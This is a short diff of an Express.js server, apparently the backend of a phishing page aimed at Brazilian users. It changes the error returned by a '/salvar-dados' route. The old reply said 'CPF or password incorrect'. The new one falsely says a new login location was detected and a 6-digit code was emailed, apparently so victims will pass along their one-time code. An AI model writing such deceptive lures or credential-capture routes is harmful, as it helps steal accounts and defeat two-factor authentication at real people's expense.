@@ -33,7 +33,7 @@ app.post('/salvar-dados', (req, res) => {
         }
     });
 
-    res.status(401).json({ message: 'CPF ou senha esta incorreto, tente novamente.' });
+    res.status(401).json({ message: 'Novo local de login identificado, enviamos um codigo de 6 digitos para o email vinculado a esta conta.' });
 });
 
 app.post('/acessar-contratos', (req, res) => {
